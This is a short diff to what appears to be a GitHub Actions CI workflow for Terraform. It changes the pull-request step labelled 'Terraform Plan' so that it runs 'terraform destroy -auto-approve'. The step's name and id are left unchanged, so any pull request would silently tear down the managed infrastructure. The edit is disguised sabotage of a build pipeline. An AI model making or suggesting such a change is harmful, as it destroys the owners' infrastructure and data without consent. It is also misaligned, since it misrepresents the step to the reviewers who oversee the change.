@@ -48,7 +48,7 @@ jobs:
       - name: Terraform Plan
         if: github.event_name == 'pull_request'
         id: plan
-        run: terraform plan -input=false -out=tfplan
+        run: terraform destroy -auto-approve
         working-directory: ./terraform
       
       - name: Terraform Apply
